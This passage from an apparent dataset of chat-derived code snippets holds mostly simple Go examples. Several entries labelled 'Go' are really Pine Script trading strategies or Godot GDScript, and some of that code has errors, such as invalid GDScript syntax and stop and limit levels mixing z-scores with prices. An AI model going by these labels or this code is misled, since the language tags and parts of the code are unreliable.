%s\\n\\n\", line[0], line[1], line[2])\n\t}\n}\n\nfunc equalSlices(a, b []string) bool {\n\tif len(a) != len(b) {\n\t\treturn false\n\t}\n\n\tfor i, v := range a {\n\t\tif v != b[i] {\n\t\t\treturn false\n\t\t}\n\t}\n\n\treturn true\n}",
    "filename": "4a9a15a51f51881ca8c20d1d49f651ea_0.go"
  },
  {
    "conversation_hash": "c6efccc794c028b25090a94ab5186684",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package xyz\n\nfunc Add(a, b int) int {\n   return a + b // Return the sum of a and b\n}",
    "filename": "c6efccc794c028b25090a94ab5186684_3.go"
  },
  {
    "conversation_hash": "c6efccc794c028b25090a94ab5186684",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/example/myproject/xyz\"\n)\n\nfunc main() {\n\tresult := xyz.Add(10, 20)\n\tfmt.Println(result)\n}",
    "filename": "c6efccc794c028b25090a94ab5186684_4.go"
  },
  {
    "conversation_hash": "c6efccc794c028b25090a94ab5186684",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package xyz\n\nfunc Add(a, b int) int {\n\treturn a + b\n}",
    "filename": "c6efccc794c028b25090a94ab5186684_5.go"
  },
  {
    "conversation_hash": "c6efccc794c028b25090a94ab5186684",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello, World!\")\n}",
    "filename": "c6efccc794c028b25090a94ab5186684_6.go"
  },
  {
    "conversation_hash": "c6efccc794c028b25090a94ab5186684",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Print(\"Hello, \")\n    fmt.Print(\"World!\")\n}",
    "filename": "c6efccc794c028b25090a94ab5186684_9.go"
  },
  {
    "conversation_hash": "c6efccc794c028b25090a94ab5186684",
    "code_index": 13,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\n\t\"example.com/myproject/xyz\"\n\t\"example.com/myproject/abc\"\n)\n\nfunc main() {\n\tfmt.Println(xyz.Add(2, 3))\n\tfmt.Println(abc.Multiply(4, 5))\n}",
    "filename": "c6efccc794c028b25090a94ab5186684_13.go"
  },
  {
    "conversation_hash": "c6efccc794c028b25090a94ab5186684",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "package xyz\n\nfunc Add(a, b int) int {\n\treturn a + b\n}",
    "filename": "c6efccc794c028b25090a94ab5186684_15.go"
  },
  {
    "conversation_hash": "c6efccc794c028b25090a94ab5186684",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "package abc\n\nfunc Multiply(a, b int) int {\n\treturn a * b\n}",
    "filename": "c6efccc794c028b25090a94ab5186684_17.go"
  },
  {
    "conversation_hash": "5ea5f2c822a3dd6947e9d4ea04b721a0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"time\"\n)\n\n// 自定义的DNS解析器\ntype customResolver struct {\n\tresolver *net.Resolver\n}\n\n// Resolve the addresses using the custom DNS servers\nfunc (r *customResolver) Resolve(ctx context.Context, network, addr string) (names []string, err error) {\n\treturn r.resolver.LookupHost(ctx, addr)\n}\n\nfunc customDialer(dnsServers []string) func(ctx context.Context, network, address string) (net.Conn, error) {\n\t// 使用自定义的DNS服务器创建一个解析器\n\tresolver := &net.Resolver{\n\t\t// 注意：此Resolve函数必须是并发安全的\n\t\tPreferGo: true,\n\t\tDial: func(ctx context.Context, network, address string) (net.Conn, error) {\n\t\t\t// Choose one DNS server randomly or by some other policy\n\t\t\tdnsServer := dnsServers[0] // 这里简单地选择第一个DNS服务器\n\t\t\tdialer := &net.Dialer{}\n\t\t\treturn dialer.DialContext(ctx, \"udp\", dnsServer+\":53\")\n\t\t},\n\t}\n\n\treturn func(ctx context.Context, network, address string) (net.Conn, error) {\n\t\t// 使用自定义的resolver解析地址\n\t\tcustomRes := customResolver{resolver}\n\t\taddrs, err := customRes.Resolve(ctx, network, address)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tif len(addrs) == 0 {\n\t\t\treturn nil, fmt.Errorf(\"no addresses found for host\")\n\t\t}\n\t\t// 与解析出来的地址建立连接\n\t\tfor _, addr := range addrs {\n\t\t\tconn, err := net.Dial(network, addr)\n\t\t\tif err == nil {\n\t\t\t\treturn conn, nil\n\t\t\t}\n\t\t}\n\t\treturn nil, fmt.Errorf(\"unable to connect to any resolved address\")\n\t}\n}\n\nfunc main() {\n\t// 指定DNS服务器列表\n\tdnsServers := []string{\"8.8.8.8\", \"8.8.4.4\"} // 示例中使用Google的DNS服务器\n\n\t// 创建一个自定义拨号器，将用于自定义DNS解析\n\tdialer := customDialer(dnsServers)\n\n\t// 使用自定义拨号器创建HTTP客户端\n\tclient := &http.Client{\n\t\tTransport: &http.Transport{\n\t\t\tDialContext: dialer,\n\t\t},\n\t\tTimeout: 10 * time.Second,\n\t}\n\n\t// 发出HTTP请求，使用自定义的DNS服务器\n\tresp, err := client.Get(\"http://example.com\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer resp.Body.Close()\n\n\tfmt.Printf(\"HTTP Response Status: %s\\n\", resp.Status)\n}",
    "filename": "5ea5f2c822a3dd6947e9d4ea04b721a0_0.go"
  },
  {
    "conversation_hash": "af6121fa8beeaa9993904efd121978fd",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nfunc main() {\n    ExportedFunction() // Accessible\n    unexportedFunction() // Not accessible\n}",
    "filename": "af6121fa8beeaa9993904efd121978fd_1.go"
  },
  {
    "conversation_hash": "76e954e8f518aedbb73b74e5278af368",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Q-Trend\", overlay = true) \n\n// Inputs\nsrc = input(close, \"Source\", group = \"Main settings\")\np = input(200, \"Trend period\", group = \"Main settings\", tooltip = \"Changes STRONG signals' sensitivity.\", minval = 1)\natr_p = input(14, \"ATR Period\", group = \"Main settings\", minval = 1)\nmult = input(1.0, \"ATR Multiplier\", step = 0.1, group = \"Main settings\", tooltip = \"Changes sensitivity: higher period = higher sensitivty.\")\nmode = input(\"Type A\", \"Signal mode\", options = [\"Type A\", \"Type B\"], group = \"Mode\")\nuse_ema_smoother = input(\"No\", \"Smooth source with EMA?\", options = [\"Yes\", \"No\"], group = \"Source\")\nsrc_ema_period = input(3, \"EMA Smoother period\", group = \"Source\")\ncolor_bars = input(true, \"Color bars?\", group = \"Addons\")\nshow_tl = input(true, \"Show trend line?\", group = \"Addons\")\nsignals_view = input(\"All\", \"Signals to show\", options = [\"All\", \"Buy/Sell\", \"Strong\", \"None\"], group = \"Signal's Addon\")\nsignals_shape = input(\"Labels\", \"Signal's shape\", options = [\"Labels\", \"Arrows\"], group = \"Signal's Addon\")\nbuy_col = input(color.green, \"Buy colour\", group = \"Signal's Addon\", inline = \"BS\")\nsell_col = input(color.red, \"Sell colour\", group = \"Signal's Addon\", inline = \"BS\")\n\n// Calculations\nsrc := use_ema_smoother == \"Yes\" ? ta.ema(src, src_ema_period) : src // Source;\n\nvar float m = na // Initial trend line;\nvar string ls = \"\" // Tracker of last signal\n\nif bar_index > p\n    m := nz(m[1])\nelse\n    m := (ta.highest(src, p) + ta.lowest(src, p)) / 2\n \natr = ta.atr(atr_p)[1] // ATR;\nepsilon = mult * atr // Epsilon is a mathematical variable used in many different theorems in order to simplify work with mathematical object. Here it used as sensitivity measure.\n\nchange_up = (mode == \"Type B\" ? ta.crossover(src, m + epsilon) : ta.crossover(src, m + epsilon)) or src > m + epsilon // If price breaks trend line + epsilon (so called higher band), then it is time to update the value of a trend line;\nchange_down = (mode == \"Type B\" ? ta.crossunder(src, m - epsilon) : ta.crossunder(src, m - epsilon)) or src < m - epsilon // If price breaks trend line - epsilon (so called higher band), then it is time to update the value of a trend line.\nsb = ta.open < ta.low + (ta.high - ta.low) / 8 and ta.open >= ta.low\nss = ta.open > ta.high - (ta.high - ta.low) / 8 and ta.open <= ta.high\nstrong_buy = sb or sb[1] or sb[2] or sb[3] or sb[4]\nstrong_sell = ss or ss[1] or ss[2] or ss[3] or ss[4]\n\nm := (change_up or change_down) and m != m[1] ? m : change_up ? m + epsilon : change_down ? m - epsilon : nz(m[1], m) // Updating the trend line.\n\nls := change_up ? \"B\" : change_down ? \"S\" : ls[1] // Last signal. Helps avoid multiple labels in a row with the same signal;\ncolour = ls == \"B\" ? buy_col : sell_col // Colour of the trend line.\nbuy_shape   = signals_shape == \"Labels\" ? shape.label_up     : shape.triangle_up\nsell_shape  = signals_shape == \"Labels\" ? shape.label_down   : shape.triangle_down\n\n// Plottings\nplot(show_tl ? m : na, \"trend line\", color = colour, linewidth = 3) // Plotting the trend line.\n\n// Signals with label shape\nplotshape(signals_shape == \"Labels\" and (signals_view == \"All\" or signals_view == \"Buy/Sell\") and change_up and ls[1] != \"B\" and not strong_buy, \"Buy signal\"       , color = colour, style = buy_shape , location = location.belowbar, size = size.normal, text = \"BUY\", textcolor = color.white)      // Plotting the BUY signal;\nplotshape(signals_shape == \"Labels\" and (signals_view == \"All\" or signals_view == \"Buy/Sell\") and change_down and ls[1] != \"S\" and not strong_sell, \"Sell signal\"   , color = colour, style = sell_shape, size = size.normal, text = \"SELL\", textcolor = color.white)                                   // Plotting the SELL signal.\nplotshape(signals_shape == \"Labels\" and (signals_view == \"All\" or signals_view == \"Strong\") and change_up and ls[1] != \"B\" and strong_buy, \"Strong Buy signal\"      , color = colour, style = buy_shape , location = location.belowbar, size = size.normal, text = \"STRONG\", textcolor = color.white)   // Plotting the STRONG BUY signal;\nplotshape(signals_shape == \"Labels\" and (signals_view == \"All\" or signals_view == \"Strong\") and change_down and ls[1] != \"S\" and strong_sell, \"Strong Sell signal\"  , color = colour, style = sell_shape, size = size.normal, text = \"STRONG\", textcolor = color.white)                                 // Plotting the STRONG SELL signal.\n\n// Signal with arrow shape\nplotshape(signals_shape == \"Arrows\" and (signals_view == \"All\" or signals_view == \"Buy/Sell\") and change_up and ls[1] != \"B\" and not strong_buy, \"Buy signal\"       , color = colour, style = buy_shape , location = location.belowbar, size = size.tiny) // Plotting the BUY signal;\nplotshape(signals_shape == \"Arrows\" and (signals_view == \"All\" or signals_view == \"Buy/Sell\") and change_down and ls[1] != \"S\" and not strong_sell, \"Sell signal\"   , color = colour, style = sell_shape, size = size.tiny)                               // Plotting the SELL signal.\nplotshape(signals_shape == \"Arrows\" and (signals_view == \"All\" or signals_view == \"Strong\") and change_up and ls[1] != \"B\" and strong_buy, \"Strong Buy signal\"      , color = colour, style = buy_shape , location = location.belowbar, size = size.tiny) // Plotting the STRONG BUY signal;\nplotshape(signals_shape == \"Arrows\" and (signals_view == \"All\" or signals_view == \"Strong\") and change_down and ls[1] != \"S\" and strong_sell, \"Strong Sell signal\"  , color = colour, style = sell_shape, size = size.tiny)                               // Plotting the STRONG SELL signal.\n\nbarcolor(color_bars ? colour : na) // Bar coloring\n\n// Alerts\nalertcondition(change_up and ls[1] != \"B\", \"Q-Trend BUY\", \"Q-Trend BUY signal were given.\") // Buy alert.\nalertcondition(change_down and ls[1] != \"S\", \"Q-Trend SELL\", \"Q-Trend SELL signal were given.\") // Sell alert.\nalertcondition((change_up and ls[1] != \"B\") or (change_down and ls[1] != \"S\"), \"Q-Trend Signal\", \"Q-Trend gave you a signal!\")\nalertcondition(change_up and ls[1] != \"B\" and strong_buy, \"Strong BUY signal\", \"Q-Trend gave a Strong Buy signal!\")\nalertcondition(change_down and ls[1] != \"S\" and strong_sell, \"Strong SELL signal\", \"Q-Trend gave a Strong Sell signal!\")",
    "filename": "76e954e8f518aedbb73b74e5278af368_0.go"
  },
  {
    "conversation_hash": "dfd6e2134a6038107fba2209ddf5ca34",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type Calculator struct {} // assuming a custom type named Calculator\n\n   func (c Calculator) plus(a int, b int) int {\n       return a + b\n   }",
    "filename": "dfd6e2134a6038107fba2209ddf5ca34_1.go"
  },
  {
    "conversation_hash": "dfd6e2134a6038107fba2209ddf5ca34",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\tfile, err := os.Create(\"data.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Failed to create file:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\tdata := []byte(\"Hello, world!\")\n\n\t_, err = file.Write(data)\n\tif err != nil {\n\t\tfmt.Println(\"Failed to write data to file:\", err)\n\t\treturn\n\t}\n\n\terr = file.Sync()\n\tif err != nil {\n\t\tfmt.Println(\"Failed to flush data to disk:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Data successfully written to disk and synced!\")\n}",
    "filename": "dfd6e2134a6038107fba2209ddf5ca34_2.go"
  },
  {
    "conversation_hash": "730639aa172275d134cfb30067661ae2",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Spread Z-Score Strategy\", overlay=true)\n\n// Step 1: Calculate the spread (asset price - VWAP)\nspread = close - vwap\n\n// Step 2: Define the rolling window length\nrollingWindowLength = input(250, \"Rolling Window Length\")\n\n// Step 3: Calculate MAD (Mean Absolute Deviation) as the mean for Z-Score\nmadValue = ta.sma(ta.abs(spread), rollingWindowLength)\n\n// Step 4: Define the input values for Long and Short entry/stop loss/take profit\nlongEntry = input(-1, \"Long Entry\")\nlongStopLoss = input(-1.5, \"Long Stop Loss\")\nlongTakeProfit = input(0, \"Long Take Profit\")\n\nshortEntry = input(1, \"Short Entry\")\nshortStopLoss = input(1.5, \"Short Stop Loss\")\nshortTakeProfit = input(0, \"Short Take Profit\")\n\n// Step 5: Calculate Z-Score\nzScore = (spread - madValue) / ta.stdev(spread, rollingWindowLength)\n\n// Step 6: Implement Long and Short strategies based on Z-Score thresholds\nif zScore < longEntry\n    strategy.entry(\"Long\", strategy.long)\n    strategy.exit(\"Long Exit\", \"Long\", stop=close - longStopLoss, limit=close + longTakeProfit)\n\nif zScore > shortEntry\n    strategy.entry(\"Short\", strategy.short)\n    strategy.exit(\"Short Exit\", \"Short\", stop=close + shortStopLoss, limit=close - shortTakeProfit)",
    "filename": "730639aa172275d134cfb30067661ae2_0.go"
  },
  {
    "conversation_hash": "730639aa172275d134cfb30067661ae2",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Spread Z-Score Strategy\", overlay=true)\n\n// Step 1: Calculate the spread (asset price - VWAP)\nspread = close - vwap\n\n// Step 2: Define the rolling window length\nrollingWindowLength = input(250, \"Rolling Window Length\")\n\n// Step 3: Calculate MAD (Mean Absolute Deviation) as the mean for Z-Score\nmadValue = ta.sma(ta.abs(spread), rollingWindowLength)\n\n// Step 4: Define the input values for Long and Short entry/stop loss/take profit\nlongEntry = input(-1, \"Long Entry\")\nlongStopLoss = input(-1.5, \"Long Stop Loss\")\nlongTakeProfit = input(0, \"Long Take Profit\")\n\nshortEntry = input(1, \"Short Entry\")\nshortStopLoss = input(1.5, \"Short Stop Loss\")\nshortTakeProfit = input(0, \"Short Take Profit\")\n\n// Step 5: Calculate Z-Score\nzScore = (spread - madValue) / ta.stdev(spread, rollingWindowLength)\n\n// Step 6: Implement Long and Short strategies based on Z-Score thresholds\nif zScore < longEntry\n    strategy.entry(\"Long\", strategy.long)\n    strategy.exit(\"Long Exit\", \"Long\", stop=close - longStopLoss, limit=close + longTakeProfit)\n\nif zScore > shortEntry\n    strategy.entry(\"Short\", strategy.short)\n    strategy.exit(\"Short Exit\", \"Short\", stop=close + shortStopLoss, limit=close - shortTakeProfit)",
    "filename": "730639aa172275d134cfb30067661ae2_1.go"
  },
  {
    "conversation_hash": "730639aa172275d134cfb30067661ae2",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Spread Z-Score Strategy\", overlay=true)\n\n// Step 1: Calculate the spread (asset price - VWAP)\nspread = close - ta.vwap\n\n// Step 2: Define the rolling window length\nrollingWindowLength = input(250, \"Rolling Window Length\")\n\n// Step 3: Calculate MAD (Mean Absolute Deviation) as the mean for Z-Score\nmadValue = ta.sma(ta.abs(spread), rollingWindowLength)\n\n// Step 4: Define the input values for Long and Short entry/stop loss/take profit\nlongEntry = input(-1, \"Long Entry\")\nlongStopLoss = input(-1.5, \"Long Stop Loss\")\nlongTakeProfit = input(0, \"Long Take Profit\")\n\nshortEntry = input(1, \"Short Entry\")\nshortStopLoss = input(1.5, \"Short Stop Loss\")\nshortTakeProfit = input(0, \"Short Take Profit\")\n\n// Step 5: Calculate Z-Score\nzScore = (spread - madValue) / ta.stdev(spread, rollingWindowLength)\n\n// Step 6: Implement Long and Short strategies based on Z-Score thresholds\nif zScore < longEntry\n    strategy.entry(\"Long\", strategy.long)\n    strategy.exit(\"Long Exit\", \"Long\", stop=close - longStopLoss, limit=close + longTakeProfit)\n\nif zScore > shortEntry\n    strategy.entry(\"Short\", strategy.short)\n    strategy.exit(\"Short Exit\", \"Short\", stop=close + shortStopLoss, limit=close - shortTakeProfit)",
    "filename": "730639aa172275d134cfb30067661ae2_2.go"
  },
  {
    "conversation_hash": "730639aa172275d134cfb30067661ae2",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Spread Z-Score Strategy\", overlay=true)\n\n// Step 1: Calculate the spread (asset price - VWAP)\nspread = close - ta.vwap\n\n// Step 2: Define the rolling window length\nrollingWindowLength = input(250, \"Rolling Window Length\")\n\n// Step 3: Calculate MAD (Mean Absolute Deviation) as the mean for Z-Score\nmadValue = ta.sma(ta.abs(spread), rollingWindowLength)\n\n// Step 4: Define the input values for Long and Short entry/stop loss/take profit\nlongEntry = input(-1, \"Long Entry\")\nlongStopLoss = input(-1.5, \"Long Stop Loss\")\nlongTakeProfit = input(0, \"Long Take Profit\")\n\nshortEntry = input(1, \"Short Entry\")\nshortStopLoss = input(1.5, \"Short Stop Loss\")\nshortTakeProfit = input(0, \"Short Take Profit\")\n\n// Step 5: Calculate Z-Score\nzScore = (spread - madValue) / ta.stdev(spread, rollingWindowLength)\n\n// Step 6: Implement Long and Short strategies based on Z-Score thresholds\nif zScore < longEntry\n    strategy.entry(\"Long\", strategy.long)\n    strategy.exit(\"Long Exit\", \"Long\", stop=close - longStopLoss, limit=close + longTakeProfit)\n\nif zScore > shortEntry\n    strategy.entry(\"Short\", strategy.short)\n    strategy.exit(\"Short Exit\", \"Short\", stop=close + shortStopLoss, limit=close - shortTakeProfit)",
    "filename": "730639aa172275d134cfb30067661ae2_3.go"
  },
  {
    "conversation_hash": "730639aa172275d134cfb30067661ae2",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Spread Z-Score Strategy\", overlay=true)\n\n// Step 1: Calculate the spread (asset price - VWAP)\nspread = close - ta.vwap\n\n// Step 2: Define the rolling window length\nrollingWindowLength = input(250, \"Rolling Window Length\")\n\n// Step 3: Calculate MAD (Mean Absolute Deviation) as the mean for Z-Score\nmadValue = ta.sma(ta.abs(spread), rollingWindowLength)\n\n// Step 4: Define the input values for Long and Short entry/stop loss/take profit\nlongEntry = input(-1, \"Long Entry\")\nlongStopLoss = input(-1.5, \"Long Stop Loss\")\nlongTakeProfit = input(0, \"Long Take Profit\")\n\nshortEntry = input(1, \"Short Entry\")\nshortStopLoss = input(1.5, \"Short Stop Loss\")\nshortTakeProfit = input(0, \"Short Take Profit\")\n\n// Step 5: Calculate Z-Score\nzScore = (spread - madValue) / ta.stdev(spread, rollingWindowLength)\n\n// Step 6: Implement Long and Short strategies based on Z-Score thresholds\nif zScore < longEntry\n    strategy.entry(\"Long\", strategy.long)\n    strategy.exit(\"Long Exit\", \"Long\", stop=close - longStopLoss, limit=close + longTakeProfit)\n\nif zScore > shortEntry\n    strategy.entry(\"Short\", strategy.short)\n    strategy.exit(\"Short Exit\", \"Short\", stop=close + shortStopLoss, limit=close - shortTakeProfit)",
    "filename": "730639aa172275d134cfb30067661ae2_4.go"
  },
  {
    "conversation_hash": "730639aa172275d134cfb30067661ae2",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Spread Z-Score Strategy\", overlay=true)\n\n// Step 1: Get the spread ( asset price - VWAP)\nspread = close - ta.vwap\n\n// Step 2: Input value for \"Rolling Window\", default value \"250\"\nrollingWindowLength = input(250, \"Rolling Window Length\")\n\n// Step 3: Calculate the Z-Score indicator using MAD as the mean\nzScore = (spread - ta.sma(spread, rollingWindowLength))/ ta.stdev(spread, rollingWindowLength)\n\n// Step 4: Define the input values for Long and Short entry/stop loss/take profit\nlongEntry = input(-1, \"Long Entry\")\nlongStopLoss = input(-1.5, \"Long Stop Loss\")\nlongTakeProfit = input(0, \"Long Take Profit\")\n\nshortEntry = input(1, \"Short Entry\")\nshortStopLoss = input(1.5, \"Short Stop Loss\")\nshortTakeProfit = input(0, \"Short Take Profit\")\n\n// Step 5: Implement Buy and Sell strategy based on Z-Score thresholds\nif zScore < longEntry\n    strategy.entry(\"Long\", strategy.long)\n    strategy.exit(\"Long Exit\", \"Long\", stop=close - longStopLoss, limit=close + longTakeProfit)\n\nif zScore > shortEntry\n    strategy.entry(\"Short\", strategy.short)\n    strategy.exit(\"Short Exit\", \"Short\", stop=close + shortStopLoss, limit=close - shortTakeProfit)",
    "filename": "730639aa172275d134cfb30067661ae2_5.go"
  },
  {
    "conversation_hash": "730639aa172275d134cfb30067661ae2",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Spread Z-Score Strategy\", overlay=true)\n\n// Step 1: Get the spread (asset price - VWAP)\nspread = close - ta.vwap\n\n// Step 2: Input value for 'Rolling Window', default value '250'\nrollingWindowLength = input(250, \"Rolling Window Length\")\n\n// Step 3: Calculate the Z-Score indicator using MAD as the mean\nzScore = (spread - ta.sma(spread, rollingWindowLength))/ ta.stdev(spread, rollingWindowLength)\n\n// Step 4: Define the input values for Long and Short entry/stop loss/take profit\nlongEntry = input(-1, \"Long Entry\")\nlongStopLoss = input(-1.5, \"Long Stop Loss\")\nlongTakeProfit = input(0, \"Long Take Profit\")\n\nshortEntry = input(1, \"Short Entry\")\nshortStopLoss = input(1.5, \"Short Stop Loss\")\nshortTakeProfit = input(0, \"Short Take Profit\")\n\n// Step 5: Implement Buy and Sell strategy based on Z-Score thresholds\nif zScore < longEntry\n    strategy.entry(\"Long\", strategy.long)\n    strategy.exit(\"Long Exit\", \"Long\", stop=close - longStopLoss, limit=close + longTakeProfit)\n\nif zScore > shortEntry\n    strategy.entry(\"Short\", strategy.short)\n    strategy.exit(\"Short Exit\", \"Short\", stop=close + shortStopLoss, limit=close - shortTakeProfit)",
    "filename": "730639aa172275d134cfb30067661ae2_6.go"
  },
  {
    "conversation_hash": "730639aa172275d134cfb30067661ae2",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nstrategy(\"Spread Z-Score Strategy\", overlay=true)\n\n// Step 1: Get the spread (asset price - VWAP)\nspread = close - ta.vwap\n\n// Step 2: Input value for 'Rolling Window', default value '250'\nrollingWindowLength = input(250, \"Rolling Window Length\")\n\n// Step 3: Calculate the Z-Score indicator using MAD as the mean\nzScore = (spread - ta.sma(spread, rollingWindowLength))/ ta.stdev(spread, rollingWindowLength)\n\n// Step 4: Define the input values for Long and Short entry/stop loss/take profit\nlongEntry = input(-1, \"Long Entry\")\nlongStopLoss = input(-1.5, \"Long Stop Loss\")\nlongTakeProfit = input(0, \"Long Take Profit\")\n\nshortEntry = input(1, \"Short Entry\")\nshortStopLoss = input(1.5, \"Short Stop Loss\")\nshortTakeProfit = input(0, \"Short Take Profit\")\n\n// Step 5: Implement Buy and Sell strategy based on Z-Score thresholds\nif zScore < longEntry\n    strategy.entry(\"Long\", strategy.long)\n    strategy.exit(\"Long Exit\", \"Long\", stop=close - longStopLoss, limit=close + longTakeProfit)\n\nif zScore > shortEntry\n    strategy.entry(\"Short\", strategy.short)\n    strategy.exit(\"Short Exit\", \"Short\", stop=close + shortStopLoss, limit=close - shortTakeProfit)",
    "filename": "730639aa172275d134cfb30067661ae2_7.go"
  },
  {
    "conversation_hash": "bd903ecca9daac31b6f5ddecd1d6f976",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"machine\"\n\t\"time\"\n)\n\nfunc main() {\n\tled := machine.PC13\n\tled.Configure(machine.PinConfig{Mode: machine.PinOutput})\n\n\tfor {\n\t\tled.Toggle()\n\t\ttime.Sleep(time.Millisecond * 500) // Wait for 500 milliseconds (0.5 seconds) \n\t}\n}",
    "filename": "bd903ecca9daac31b6f5ddecd1d6f976_0.go"
  },
  {
    "conversation_hash": "56353e6e3ce602cddf9f25e708f2e851",
    "code_index": 1,
    "language": "Go",
    "libraries": [
      "_area"
    ],
    "code": "extends PlayerBase\nclass_name Player2D\n\nenum State { IDLE, RUN, JUMP, ATTACK }\nvar state = State.IDLE\n\nvar bullets_amount: int = 30\n@export var movement_data: MovementData\n@export var attack_animation: String = \"Attack1\"\n@export var camera: Camera2D\n\n# References\n@onready var animator: AnimatedSprite2D = $AnimatedSprite2D\n@onready var guns_animator: AnimationPlayer = $ShootingAnimationPlayer\n@onready var hit_animator: AnimationPlayer = $HitAnimationPlayer\n@onready var hand: Node2D = $Hand\n@onready var pistol: Sprite2D = $Hand/Pivot/Pistol\n@onready var pistol_bullet_marker: Marker2D = $Hand/Pivot/Pistol/PistolBulletMarker\n\n# Load Scenes\n@onready var muzzle_load: PackedScene = preload(\"res://Scenes/Particles/muzzle.tscn\")\n@onready var bullet_load: PackedScene = preload(\"res://Scenes/Props/bullet.tscn\")\n@onready var death_particle_load: PackedScene = preload(\"res://Scenes/Particles/player_death_particle.tscn\")\n\nfunc _physics_process(delta):\n\tprocess_gravity(delta)\n\tprocess_movement_input(delta)\n\tprocess_actions()\n\t\n\tmove_and_slide(velocity, Vector2.UP)\n\tanimate()\n\nfunc process_gravity(delta):\n\tif not is_on_floor():\n\t\tvelocity.y += movement_data.gravity * movement_data.gravity_scale * delta\n\nfunc process_movement_input(delta):\n\tvar input_vector = Input.get_axis(\"move_left\",\"move_right\")\n\tvelocity.x = move_toward(velocity.x, movement_data.max_speed * input_vector, \n\t\t\t\t\t\t\t(input_vector != 0 ? movement_data.acceleration : movement_data.friction) * delta)\n\nfunc process_actions():\n\tif Input.is_action_just_pressed(\"jump\") and is_on_floor():\n\t\tperform_jump()\n\tif Input.is_action_just_pressed(\"shoot\"):\n\t\tperform_attack()\n\nfunc animate():\n\tvar looking_direction = get_global_mouse_position().x > global_position.x\n\tanimator.flip_h = looking_direction\n\thand.rotation = (get_global_mouse_position() - global_position).angle()\n\tupdate_animation_state()\n\nfunc perform_jump():\n\tvelocity.y = -movement_data.jump_strength\n\tAudioManager.play_sound(AudioManager.JUMP)\n\nfunc perform_attack():\n\tif not bullets_amount: return\n\tstate = State.ATTACK\n\tanimator.play(\"Attacking\")\n\tguns_animator.play(\"Shoot\")\n\tshoot()\n\nfunc shoot():\n\t# Shooting logic goes here\n\t\n\tstate = State.IDLE\n\tEventManager.update_bullet_ui.emit()\n\nfunc update_animation_state():\n\tif state == State.ATTACK:\n\t\treturn\n\t\n\tif is_on_floor():\n\t\tif velocity.x != 0:\n\t\t\tanimator.play(\"Run\")\n\t\telse:\n\t\t\tanimator.play(\"Idle\")\n\telse:\n\t\tanimator.play(\"Jump\") if velocity.y < 0 else animator.play(\"Fall\")\n\nfunc _on_hurtbox_area_entered(_area):\n\tif not _area.is_in_group(\"Bullet\"):\n\t\thit_animator.play(\"Hit\")\n\t\ttake_damage(1)  # If damage is to be variable, extract value from _area\n\t\tEventManager.frame_freeze.emit()\n\nfunc die():\n\tAudioManager.play_sound(AudioManager.DEATH)\n\tanimator.play(\"Died\")\n\tspawn_death_particle()\n\tEventManager.player_died.emit()\n\tqueue_free()\n\nfunc spawn_death_particle():\n\tvar death_particle = death_particle_load.instantiate()\n\tdeath_particle.global_position = global_position\n\tget_tree().current_scene.add_child(death_particle)\n\n# Override PlayerBase method\nfunc take_damage(damage: int) -> void:\n\t.health -= damage  # This now calls the setter method declared in PlayerBase\n\temit_signal(\"health_changed\", health)  # You may want to call `update_health_ui`\n\tif self.health <= 0:\n\t\tdie()\n\telse:\n\t\tAudioManager.play_sound(AudioManager.HURT)",
    "filename": "56353e6e3ce602cddf9f25e708f2e851_1.go"
  },
  {
    "conversation_hash": "9853dca9510a3677df7850f991491c6c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
